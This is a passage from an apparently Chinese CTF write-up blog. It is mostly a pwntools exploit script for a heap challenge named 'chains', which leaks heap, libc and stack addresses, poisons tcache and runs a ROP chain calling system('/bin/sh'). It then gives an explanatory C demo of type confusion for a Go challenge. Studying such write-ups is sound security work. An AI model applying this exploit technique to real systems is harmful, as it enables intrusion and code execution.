<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="nf">ls</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="c1"># Context settings
</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span> <span class="c1"># info
</span><span class="n">context</span><span class="p">.</span><span class="n">terminal</span>  <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-l</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">170</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span>   <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span> <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">CMD</span><span class="p">:</span> <span class="k">return</span> <span class="nf">process</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">))</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">REM</span><span class="p">:</span> <span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">89.169.156.185</span><span class="sh">'</span><span class="p">,</span> <span class="mi">13995</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">AWD</span><span class="p">:</span> <span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nf">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
    <span class="sh">'''</span><span class="s">     Usage: python3 exp.py AWD &lt;IP&gt; &lt;PORT&gt;   </span><span class="sh">'''</span>
    <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./chains</span><span class="sh">'</span>

<span class="n">elf</span>  <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">);</span><span class="n">rop</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
#continue
#brva 0x01AD1
brva 0x1314
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>


<span class="kn">import</span> <span class="n">socks</span>
<span class="n">context</span><span class="p">.</span><span class="n">proxy</span> <span class="o">=</span> <span class="p">(</span><span class="n">socks</span><span class="p">.</span><span class="n">SOCKS5</span><span class="p">,</span> <span class="sh">'</span><span class="s">192.168.100.24</span><span class="sh">'</span><span class="p">,</span> <span class="mi">10808</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Enter proxy port: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>
<span class="k">def</span> <span class="nf">rm</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
<span class="k">def</span> <span class="nf">chain</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">idl</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">chain size: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
        <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">proxy id: </span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idl</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">rm_chain</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">5</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>



<span class="nf">add</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">,</span><span class="mh">0x123</span><span class="p">)</span>
<span class="nf">chain</span><span class="p">(</span><span class="mi">1</span><span class="p">,[</span><span class="mi">0</span><span class="p">])</span>
<span class="nf">rm_chain</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">,</span><span class="mh">0x124</span><span class="p">)</span>
<span class="nf">chain</span><span class="p">(</span><span class="mi">1</span><span class="p">,[</span><span class="mi">0</span><span class="p">])</span>
<span class="nf">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s"> proxy #0 is </span><span class="sh">'</span><span class="p">)</span>
<span class="n">heap_base</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x2a0</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">heap_base</span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#show(0)
#rm(0)
#rm(0)
#show(0)
</span>
<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x451</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="sh">'</span><span class="s">33</span><span class="sh">'</span><span class="p">,</span><span class="mh">0x22</span><span class="p">)</span> <span class="c1"># 2
</span><span class="nf">add</span><span class="p">(</span><span class="n">pay</span><span class="p">,</span><span class="mh">0x23</span><span class="p">)</span> <span class="c1"># 3
</span><span class="nf">add</span><span class="p">(</span><span class="sh">'</span><span class="s">55</span><span class="sh">'</span><span class="p">,</span><span class="mh">0x24</span><span class="p">)</span> <span class="c1"># 4
</span>
<span class="nf">chain</span><span class="p">(</span><span class="mi">1</span><span class="p">,[</span><span class="mi">2</span><span class="p">])</span> <span class="c1"># 1
</span><span class="nf">chain</span><span class="p">(</span><span class="mi">1</span><span class="p">,[</span><span class="mi">2</span><span class="p">])</span> <span class="c1"># 2
</span><span class="nf">chain</span><span class="p">(</span><span class="mi">1</span><span class="p">,[</span><span class="mi">2</span><span class="p">])</span> <span class="c1"># 3
</span>
<span class="nf">rm_chain</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="nf">chain</span><span class="p">(</span><span class="mi">1</span><span class="p">,[</span><span class="mi">3</span><span class="p">])</span> <span class="c1"># 4
</span><span class="nf">chain</span><span class="p">(</span><span class="mi">1</span><span class="p">,[</span><span class="mi">3</span><span class="p">])</span> <span class="c1"># 5
</span>


<span class="nf">rm</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="nf">add</span><span class="p">(</span><span class="nf">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x460</span><span class="p">),</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># 5
</span><span class="nf">add</span><span class="p">(</span><span class="sh">'</span><span class="s">pad1</span><span class="sh">'</span><span class="p">,</span><span class="mh">0x1</span><span class="p">)</span> <span class="c1"># 6
</span><span class="nf">add</span><span class="p">(</span><span class="sh">'</span><span class="s">pad2</span><span class="sh">'</span><span class="p">,</span><span class="mh">0x1</span><span class="p">)</span> <span class="c1"># 7
</span><span class="nf">add</span><span class="p">(</span><span class="sh">'</span><span class="s">pad3</span><span class="sh">'</span><span class="p">,</span><span class="mh">0x1</span><span class="p">)</span> <span class="c1"># 8
</span><span class="nf">add</span><span class="p">(</span><span class="sh">'</span><span class="s">pad4</span><span class="sh">'</span><span class="p">,</span><span class="mh">0x1</span><span class="p">)</span> <span class="c1"># 9
</span><span class="nf">add</span><span class="p">(</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x81</span><span class="p">),</span><span class="mh">0x1</span><span class="p">)</span> <span class="c1"># 7
</span>
<span class="nf">rm_chain</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="sh">'</span><span class="s">pad4</span><span class="sh">'</span><span class="p">,</span><span class="mh">0x1</span><span class="p">)</span> <span class="c1"># 10
</span><span class="nf">add</span><span class="p">(</span><span class="sh">'</span><span class="s">pad5</span><span class="sh">'</span><span class="p">,</span><span class="mh">0x1</span><span class="p">)</span> <span class="c1"># 11
</span>
<span class="nf">rm</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
<span class="n">pay</span>  <span class="o">=</span> <span class="mh">0x48</span> <span class="o">*</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x530</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="n">pay</span><span class="p">,</span><span class="mh">0x1</span><span class="p">)</span> <span class="c1"># 11
#chain(1,[4]) # 6
#chain(1,[4]) # 6
##chain(1,[4]) # 6
</span><span class="nf">chain</span><span class="p">(</span><span class="mi">1</span><span class="p">,[</span><span class="mi">4</span><span class="p">])</span>

<span class="nf">show</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">is </span><span class="sh">'</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span> <span class="o">-</span> <span class="mi">2112288</span>

<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>

<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>

<span class="n">env</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">environ</span><span class="sh">'</span><span class="p">]</span>

<span class="nf">rm</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
<span class="n">pay</span>  <span class="o">=</span> <span class="mh">0x48</span> <span class="o">*</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">env</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="n">pay</span><span class="p">,</span><span class="mh">0x1</span><span class="p">)</span> <span class="c1"># 11
</span>
<span class="nf">show</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">is </span><span class="sh">'</span><span class="p">)</span>
<span class="n">stack</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span> <span class="o">-</span> <span class="mi">8</span>

<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">stack</span><span class="sh">'</span><span class="p">)</span>


<span class="nf">rm</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
<span class="n">pay</span>  <span class="o">=</span> <span class="mh">0x48</span> <span class="o">*</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x440</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="n">pay</span><span class="p">,</span><span class="mh">0x1</span><span class="p">)</span> <span class="c1"># 11
</span>

<span class="nf">rm</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
<span class="nf">rm</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
<span class="nf">rm</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="c1">#rm_chain(4)
</span><span class="n">key</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">&gt;&gt;</span> <span class="mh">0xC</span>
<span class="n">pay</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x18</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">((</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x20</span><span class="p">)</span> <span class="o">^</span> <span class="n">key</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">((</span><span class="n">stack</span><span class="o">-</span><span class="mi">400</span><span class="p">)</span> <span class="o">^</span> <span class="n">key</span><span class="p">)</span>

<span class="nf">add</span><span class="p">(</span><span class="n">pay</span><span class="p">,</span><span class="mh">0x1</span><span class="p">)</span> <span class="c1"># 6
</span><span class="nf">add</span><span class="p">(</span><span class="sh">'</span><span class="s">pad</span><span class="sh">'</span><span class="p">,</span><span class="mh">0x1</span><span class="p">)</span> <span class="c1"># 6
#gdb.attach(io,gdbscript)
</span><span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]</span>
<span class="n">bin_sh</span> <span class="o">=</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">))</span>
<span class="n">poprdi</span> <span class="o">=</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="sh">'</span><span class="s">pop rdi;ret</span><span class="sh">'</span><span class="p">)))</span>
<span class="n">ret</span> <span class="o">=</span> <span class="n">poprdi</span> <span class="o">+</span> <span class="mi">1</span>
<span class="n">pay</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">poprdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>

<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">heap_base</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">stack</span><span class="sh">'</span><span class="p">)</span>




<span class="nf">itr</span><span class="p">()</span>

</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241005205127-9a32m8o.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241005205127-9a32m8o.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<h2 id="gollum"><span class="me-2">gollum</span><a href="#gollum" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>go 语言写的，给了源码+</p>

<p>​<code class="language-plaintext highlighter-rouge">tree</code>​</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="nb">.</span>
├── build.sh
├── cmd
│   └── main.go
├── database
│   └── database.go
├── Dockerfile
├── go.mod
├── models
│   ├── credential.go
│   └── user.go
├── services
│   └── auth.go
└── util
    └── hashes.go
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<ul>
  <li>先简单的写一下交互菜单</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<h3 id="type-confusion-漏洞"><span class="me-2"><strong>Type Confusion 漏洞</strong></span><a href="#type-confusion-漏洞" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>以下代码展示了一个类型混淆的简单场景：</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="c1">// 定义两个不同的结构体</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
<span class="p">}</span> <span class="n">User</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">price</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">description</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
<span class="p">}</span> <span class="n">Product</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">type_confusion_demo</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">int</span> <span class="n">is_user</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">is_user</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// 假设 data 是一个 User 类型</span>
        <span class="n">User</span><span class="o">*</span> <span class="n">user</span> <span class="o">=</span> <span class="p">(</span><span class="n">User</span><span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">;</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"User ID: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">user</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"User Name: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">user</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="c1">// 假设 data 是一个 Product 类型</span>
        <span class="n">Product</span><span class="o">*</span> <span class="n">product</span> <span class="o">=</span> <span class="p">(</span><span class="n">Product</span><span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">;</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Product Price: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">product</span><span class="o">-&gt;</span><span class="n">price</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Product Description: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">product</span><span class="o">-&gt;</span><span class="n">description</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="c1">// 创建一个 User 对象</span>
    <span class="n">User</span><span class="o">*</span> <span class="n">user</span> <span class="o">=</span> <span class="p">(</span><span class="n">User</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">User</span><span class="p">));</span>
    <span class="n">user</span><span class="o">-&gt;</span><span class="n">id</span> <span class="o">=</span> <span class="mi">42</span><span class="p">;</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">user</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="s">"Alice"</span><span class="p">);</span>

    <span class="c1">// 将 User 对象错误地当作 Product 类型处理</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Interpreting User as Product:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">type_confusion_demo</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="n">free</span><span class="p">(</span><span class="n">user</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<hr />

<p><strong>运行结果</strong></p>

<p>运行上述代码后，输出可能是类似以下内容：</p>

<div class="language-mathematica highlighter-rouge"><div class="code-header">
        <span data-label-text="Mathematica"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nv">Interpreting</span><span class="w"> </span><span class="nv">User</span><span class="w"> </span><span class="nv">as</span><span class="w"> </span><span class="nb">Product</span><span class="o">:</span><span class="w">
</span><span class="nb">Product</span><span class="w"> </span><span class="nv">Price</span><span class="o">:</span><span class="w"> </span><span class="m">42</span><span class="w">
</span><span class="nb">Product</span><span class="w"> </span><span class="nv">Description</span><span class="o">:</span><span class="w"> </span><span class="nv">Alice</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p><strong>为什么会这样？</strong></p>

<ol>
  <li>
    <p><strong>内存布局问题</strong>：</p>

    <ul>
      <li>在 <code class="language-plaintext highlighter-rouge">User</code>​ 和 <code class="language-plaintext highlighter-rouge">Product</code>​ 的定义中，<code class="language-plaintext highlighter-rouge">id</code>​ 和 <code class="language-plaintext highlighter-rouge">price</code>​ 都是 <code class="language-plaintext highlighter-rouge">int</code>​ 类型，占据相同的内存位置。</li>
      <li>同样，<code class="language-plaintext highlighter-rouge">name</code>​ 和 <code class="language-plaintext highlighter-rouge">description</code>​ 的内存区域也重叠。</li>
    </ul>
  </li>
  <li>
    <p><strong>错误的类型解释</strong>：</p>

    <ul>
      <li>实际上传递的 <code class="language-plaintext highlighter-rouge">data</code>​ 是一个 <code class="language-plaintext highlighter-rouge">User</code>​ 类型的指针，但在函数中将其当作 <code class="language-plaintext highlighter-rouge">Product</code>​ 类型来解释，导致内存被错误地解析。</li>
    </ul>
